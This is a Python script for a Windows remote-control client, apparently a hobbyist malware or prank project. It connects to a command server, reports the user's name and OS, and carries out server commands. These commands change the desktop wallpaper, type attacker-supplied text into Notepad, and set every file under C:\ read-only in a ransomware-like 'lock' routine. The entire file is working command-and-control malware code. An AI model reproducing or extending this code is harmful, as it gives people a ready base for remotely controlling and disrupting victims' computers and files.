import os
import ctypes
import subprocess
import time
import pyautogui
from socket import *

# IP and port of the server
ip = "127.0.0.1"
port = 1234

# Path to the new wallpaper image
image_path = r"C:\Users\tatum\Downloads\as.jpeg"  # Updated image path

# Function to change the wallpaper
def change_wallpaper(image_path):
    try:
        # Use Windows API to change wallpaper
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        print(f"Wallpaper changed to {image_path}")
    except Exception as e:
        print(f"Failed to change wallpaper: {e}")

# Function to open Notepad and write the given text
def open_notepad_with_text(text):
    try:
        # Open Notepad
        notepad_process = subprocess.Popen(['notepad.exe'])
        time.sleep(1)  # Wait for Notepad to open

        # Simulate typing the text into Notepad
        pyautogui.write(text)  # Write the text into Notepad
        print(f"Written to Notepad: {text}")
    except Exception as e:
        print(f"Error opening Notepad: {e}")

# Function to lock files (set them to read-only)
def lock_files(directory):
    try:
        # Use Windows attrib command to set files as read-only
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                # Set file attribute to read-only
                subprocess.run(f'attrib +r "{file_path}"', shell=True)
        print(f"All files in {directory} are now locked (read-only).")
    except Exception as e:
        print(f"Error locking files: {e}")

try:
    client = socket(AF_INET, SOCK_STREAM)
    client.connect((ip, port))
    print(f"Connected to server at {ip}:{port}")

    # Send client information
    client_info = "client_name : tatum <-> client_os : Windows"
    client.send(client_info.encode())

    while True:
        # Receive command from the server
        cmd = client.recv(1024).decode()
        print(f"Received command: {cmd}")

        # Check for empty or invalid commands
        if cmd.strip() == "":
            print("Empty command received, not processing further.")
            break
        elif cmd.lower() == "exit":
            print("Server has terminated the connection.")
            break
        elif cmd.lower() == "error":
            print("Invalid command received from the server.")
            break  # Stop execution if there's an error
        elif cmd.lower() == "change":
            # If the command is "change", change the wallpaper
            change_wallpaper(image_path)
            client.send("Wallpaper changed.".encode())  # Send a confirmation to the server
        elif cmd.lower().startswith("text "):
            # If the command is "text <content>", extract the text
            text = cmd[len("text "):].strip()  # Get everything after "text "
            if text:  # If there is text after "text"
                open_notepad_with_text(text)
                client.send(f"Notepad opened with text: {text}".encode())
            else:
                client.send("No text provided for Notepad.".encode())
        elif cmd.lower() == "lock":
            # If the command is "lock", lock the files
            lock_files("C:\\")  # Change the directory path as needed
            client.send("Files have been locked.".encode())  # Send confirmation
        else:
            # If the command is not recognized, inform the user and stop processing further
            print(f"Invalid command received: {cmd}. Not executing this command.")
            client.send(f"Invalid command received: {cmd}".encode())
            break  # Stop processing further commands

except Exception as e:
    print(f"An error occurred: {e}")

finally:
    client.close()
    print("Client shut down.")
